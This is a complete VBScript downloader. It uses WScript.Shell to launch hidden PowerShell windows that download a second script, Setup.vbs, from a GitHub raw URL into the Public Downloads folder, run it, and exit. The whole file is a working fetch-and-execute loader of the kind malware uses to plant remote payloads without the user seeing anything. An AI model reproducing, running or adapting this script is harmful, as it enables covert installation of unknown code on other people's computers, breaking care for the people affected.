Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/RVN/refs/heads/main/Setup.vbs' -OutFile 'C:\Users\Public\Downloads\Setup.vbs'", 0, True
objShell.Run "powershell.exe Start-Process -FilePath 'C:\Users\Public\Downloads\Setup.vbs'", 0, True
objShell.Run "powershell.exe exit", 0, True
